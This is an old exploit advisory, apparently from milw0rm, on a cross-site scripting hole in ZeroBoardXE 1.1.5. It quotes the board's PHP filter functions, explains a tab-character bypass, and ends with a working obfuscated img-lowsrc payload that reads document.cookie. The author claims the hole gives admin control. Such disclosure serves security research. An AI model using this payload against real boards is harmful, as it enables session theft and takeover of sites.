<html><head><title>ZeroBoardXE 1.1.5 (09.01.22) XSS Vulnerability</title></head><pre>ZeroBoardXE 1.1.5 (09.01.22) XSS Vulnerability 
bY make0day@gmail.com
Greet to : Flyh4t
/*************************

ZeroBoardXE (VERSION 1.1.5 (09.01.22))is most famous and widely used bulletin board system of Korea.
It is freely available for all platforms that supports PHP and MySQL.
I find a XSS vulnerability. 
By using this vulnerability, Malicious person can occupy administrator permission,
It means attacker can control board system fully 
Here is the details:

**************************/
TEST ON VERSION ZeroBoardXE 1.1.5 (09.01.22)
Download : http://www.zeroboard.com
/***************************
[0x01] XSS vulnerability

/config/func.inc.php

    function removeHackTag($content) {

        $content = preg_replace_callback(&quot;!&lt;([a-z]+)(.*?)&gt;!is&quot;, removeJSEvent, $content);


        $content = preg_replace_callback(&quot;!&lt;([a-z]+)(.*?)&gt;!is&quot;, removeSrcHack, $content);

        return $content;
    }

    function removeJSEvent($matches) {
        $attrs = $matches[2];

        if(preg_match('/(src|href|lowsrc|dynsrc)=(&quot;|\'?)([\r\n]*)(vbscript|javascript)/is', $matches[2])) {
            $attrs = preg_replace('/(src|href|lowsrc|dynsrc)=(&quot;|\'?)([\r\n]*)(vbscript|javascript)/is','$1=$2_$4', $attrs);
        }

	 $attrs = preg_replace(
            '/(\r|\n| )+on(click|dblclick|mousedown|mouseup|mouseover|mouseout|mousemove|keydown|keyup|keypress|load|unload|abort|error|select|change|submit|reset|resize|scroll|focus|blur)+([= ]+)/is',
            ' _on$2=',
            $attrs
        );

        $attrs = preg_replace('/_onclick=(&quot;|\')window\.open\(this\.href\);(.?)return false;(&quot;|\')/i','onclick=$1window.open(this.href);$2return false;$3', $attrs);

        return '&lt;'.$matches[1].$attrs.'&gt;';
    }

    function removeSrcHack($matches) {
        $tag = strtolower(trim($matches[1]));

        $buff = trim(preg_replace('/(\/&gt;|&gt;)/','/&gt;',$matches[0]));
        $buff = str_replace(array('&amp;amp;','&amp;'),array('&amp;amp;','&amp;amp;'),$buff);
        $buff = preg_replace_callback('/([^=^&quot;^ ]*)=([^ ^&gt;]*)/i', fixQuotation, $buff);

        $oXmlParser = new XmlParser();
        $xml_doc = $oXmlParser-&gt;parse($buff);

        $src = $xml_doc-&gt;{$tag}-&gt;attrs-&gt;src;
        $dynsrc = $xml_doc-&gt;{$tag}-&gt;attrs-&gt;dynsrc;
        $lowsrc = $xml_doc-&gt;{$tag}-&gt;attrs-&gt;lowsrc;
        $href = $xml_doc-&gt;{$tag}-&gt;attrs-&gt;href;
        if(_isHackedSrc($src) || _isHackedSrc($dynsrc) || _isHackedSrc($lowsrc) || _isHackedSrc($href) ) return sprintf(&quot;&lt;%s&gt;&quot;,$tag);

        return $matches[0];
    }

    function _isHackedSrc($src) {
        if(!$src) return false;
        if($src) {
            $url_info = parse_url($src);
            $query = $url_info['query'];
            $queries = explode('&amp;', $query);
            $cnt = count($queries);
            for($i=0;$i&lt;$cnt;$i++) {
                $tmp_str = strtolower(trim($queries[$i]));
                $pos = strpos($tmp_str,'=');
                if($pos === false) continue;
                $key = strtolower(trim(substr($tmp_str, 0, $pos)));
                $val = strtolower(trim(substr($tmp_str,$pos+1)));
                if( ($key=='module'&amp;&amp;$val=='admin') || ($key=='act'&amp;&amp;preg_match('/admin/i',$val)) ) return true;
            }
        }
        return false;
    }

//Developer try to detect XSS hardly,
//But That`s not enough..
//The real-hacker can bypass it.
//I`m just used 09 trick.
//That`s all 
*************************/

poc:
&lt;img lowsrc=&quot;j	a	v	a	s	c	ri	pt:alert((eval(('D'+'o'+'C'+'u'+'M'+'e'+'N'+'t'+'.'+'C'+'o'+'O'+'k'+'I'+'e').toLowerCase())));&quot;&gt;

# milw0rm.com [2009-02-09]</pre></html>